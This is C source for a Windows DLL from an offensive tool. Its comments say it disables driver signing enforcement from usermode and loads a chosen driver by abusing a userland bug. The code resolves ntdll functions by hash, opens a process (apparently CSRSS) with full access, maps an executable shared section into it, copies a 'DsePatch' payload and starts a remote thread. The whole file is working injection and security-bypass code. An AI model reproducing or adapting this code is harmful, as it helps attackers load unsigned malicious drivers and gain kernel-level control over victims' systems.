/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Executes NtUserHardErrorControl in the context of 
 * CSRSS to elevate the current thread to KernelMode
 * and disable DSE.
 *
**/

D_SEC( B ) BOOL WINAPI DllMain( _In_ HINSTANCE Instance, _In_ DWORD Reason, _In_ LPVOID Parameter ) 
{
	SIZE_T			Len = 0;
	LPVOID			Lvw = NULL;
	LPVOID			Rvw = NULL;
	HANDLE			Sec = NULL;
	HANDLE			Cur = NULL;
	HANDLE			Prc = NULL;
	HANDLE			Thd = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	API			Api;
	CLIENT_ID		Cid;
	LARGE_INTEGER		Lig;
	OBJECT_ATTRIBUTES	Obj;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Lig, sizeof( Lig ) );
	RtlSecureZeroMemory( &Obj, sizeof( Obj ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.NtUnmapViewOfSection  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTUNMAPVIEWOFSECTION );
	Api.RtlCreateUserThread   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEUSERTHREAD );
	Api.NtMapViewOfSection    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTMAPVIEWOFSECTION );
	Api.NtCreateSection       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATESECTION );
	Api.NtOpenProcess         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENPROCESS );
	Api.NtClose               = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Cur = ( ( HANDLE ) - 1 );
	Obj.Length = sizeof( Obj );

	Dos = C_PTR( Instance );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Cid.UniqueProcess = C_PTR( U_PTR( Nth->FileHeader.NumberOfSymbols ) );

	if ( !( Api.NtOpenProcess( &Prc, PROCESS_ALL_ACCESS, &Obj, &Cid ) >= 0 ) ) {
		goto Leave;
	};

	Lig.QuadPart = U_PTR( G_END() - G_SYM( DsePatch ) );

	if ( Api.NtCreateSection( &Sec, SECTION_ALL_ACCESS, NULL, &Lig, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL ) >= 0 ) {
		if ( !( Api.NtMapViewOfSection( Sec, Cur, &Lvw, 0, 0, 0, &Len, ViewShare, 0, PAGE_EXECUTE_READWRITE ) >= 0 ) ) {
			goto Leave;
		};
		if ( !( Api.NtMapViewOfSection( Sec, Prc, &Rvw, 0, 0, 0, &Len, ViewShare, 0, PAGE_EXECUTE_READWRITE ) >= 0 ) ) {
			goto Leave;
		};
		__builtin_memcpy( Lvw, C_PTR( G_SYM( DsePatch ) ), U_PTR( G_END() - G_SYM( DsePatch ) ) );

		if ( ! Api.RtlCreateUserThread(
				Prc,
				NULL,
				FALSE,
				0,
				0,
				0,
				Rvw,
				NULL,
				NULL,
				NULL
		) )
		{
			//Api.NtWaitForSingleObject( Thd, FALSE, NULL );
		} else {
			goto Leave;
		};
	} else {
		goto Leave;
	};
Leave:
	if ( Lvw != NULL ) {
		Api.NtUnmapViewOfSection( Cur, Lvw );
	};
	if ( Sec != NULL ) {
		Api.NtClose( Sec );
	};
	if ( Prc != NULL ) {
		Api.NtClose( Prc );
	};
	return FALSE;
};
